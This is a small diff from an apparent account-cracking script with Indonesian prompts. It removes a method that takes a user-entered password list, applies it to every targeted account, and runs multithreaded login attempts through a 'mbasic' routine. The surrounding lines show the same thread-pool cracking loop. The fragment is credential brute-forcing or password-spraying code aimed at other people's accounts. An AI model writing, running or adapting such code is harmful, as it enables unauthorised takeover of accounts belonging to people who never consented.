@@ -98,12 +98,6 @@ class crack:
                     except:continue
             except Exception as e:print("\n[!] Error : %s"%(e))
             started();ThreadPool(35).map(self.mbasic,self.fl);os.remove(self.apk);exit()
-    def pwlist(self):
-        self.pw=input('[•] Masukkan Password : ').split(",")
-        if len(self.pw) ==0:self.pwlist()
-        else:
-            for i in self.fl:i.update({"pw":self.pw})
-            started();ThreadPool(30).map(self.mbasic,self.fl);os.remove(self.apk);exit()
     def mbasic(self,fl):
         try:
             for i in fl.get("pw"):
